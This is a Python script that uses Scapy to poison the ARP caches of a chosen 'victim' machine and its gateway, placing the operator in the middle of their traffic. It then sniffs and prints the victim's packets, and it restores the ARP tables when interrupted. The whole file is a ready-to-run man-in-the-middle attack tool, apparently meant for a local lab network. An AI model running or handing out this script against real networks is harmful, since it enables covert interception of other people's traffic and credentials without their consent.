from scapy.all import *
import time
import logging

conf.log_suppress = True
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

target_ip = input("Enter your target machine's IP address[192.168.50.200]=> ") or "192.168.50.200" # Victim's IP address 
router_ip = input("Enter your gateway's IP address[192.168.50.1]=> ") or  "192.168.50.1"   # Gateway IP address
my_mac = get_if_hwaddr(conf.iface)


def arp_spoof(src, dst,dst_mac):
    packet =ARP(op=2, pdst=dst,psrc=src,hwsrc=my_mac,hwdst=dst_mac) # type: ignore
    send(packet, verbose=False)

def get_mac(ip):
    packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip) # type: ignore
    response = srp(packet, timeout=3, verbose=False)[0]
    mac_address = response[0][1].hwsrc
    return mac_address

def reArp():
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(router_ip)
    send(ARP(op = 2, pdst = target_ip, psrc = router_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateway_mac), count = 7) # type: ignore
    send(ARP(op = 2, pdst = router_ip, psrc = target_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = target_mac), count = 7) # type: ignore


def packet_callback(packet):
    if packet.haslayer("IP") and packet["IP"].src == target_ip:
        print(f"📡 Packet from {target_ip}: {packet.summary()}")



try:
    print("Finding MAC addresses")
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(router_ip)
    time.sleep(0.5)
    print("Done!")
    time.sleep(0.2)
    print(f"Attacker's MAC: {my_mac} \nTarget's MAC: {target_mac} \nRouter's MAC: {gateway_mac}")
    time.sleep(0.5)
    print("ARP poisoning is started!")
    time.sleep(1)
    print("Press Ctrl+C to reARP and quit.")
    print(f"[*] Listening for packets from {target_ip}...")

    while 1:
        arp_spoof(src=target_ip,dst=router_ip,dst_mac=gateway_mac)
        arp_spoof(src=router_ip,dst=target_ip,dst_mac=target_mac)
        time.sleep(2)
        sniff(filter=f"ip src {target_ip}", prn=packet_callback, store=False)
except KeyboardInterrupt:
    reArp()
    print("ARP tables are normal now!")